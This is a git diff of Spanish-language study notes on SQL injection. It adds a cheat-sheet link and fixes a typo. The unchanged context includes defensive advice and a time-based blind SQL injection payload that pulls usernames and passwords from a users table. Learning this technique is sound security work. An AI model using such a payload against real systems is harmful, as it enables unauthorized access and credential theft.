@@ -23,7 +23,7 @@ Asimismo, es necesario hacer una breve distinción de los diferentes tipos de ba
 
 Es importante entender los diferentes tipos de inyecciones SQL y cómo pueden utilizarse para obtener información confidencial y controlar una base de datos. Los desarrolladores deben asegurarse de validar adecuadamente la entrada del usuario y de utilizar técnicas de defensa, como la sanitización de entrada y la preparación de consultas SQL, para prevenir las inyecciones SQL en sus aplicaciones web.
 
-
+- **SQL Injection cheat sheet** : [https://portswigger.net/web-security/sql-injection/cheat-sheet](https://portswigger.net/web-security/sql-injection/cheat-sheet)
 - **ExtendsClass MySQL Online**: [https://extendsclass.com/mysql-online.html](https://extendsclass.com/mysql-online.html)
 
 Codigo de pythom para hacer blind sqlinjection basado en codigo de estado
@@ -77,7 +77,7 @@ if __name__ == '__main__':
     makeSQLI()
 ```
 
-La consulta sql que ijectamos puede variar en dependencia de lo que querramos obtener ej:
+La consulta sql que iyectamos puede variar en dependencia de lo que querramos obtener ej:
 ```python
 #Obtener el nombre de un usuario 
 
@@ -159,3 +159,4 @@ Para obtener mas data
 ```python
 sqli_url = main_url + "?id=1 and if(ascii(substr((select group_concat(username,0x3a,password) from users),%d,1))=%d,sleep(0.35),1)" % (position, character)
 ```
+
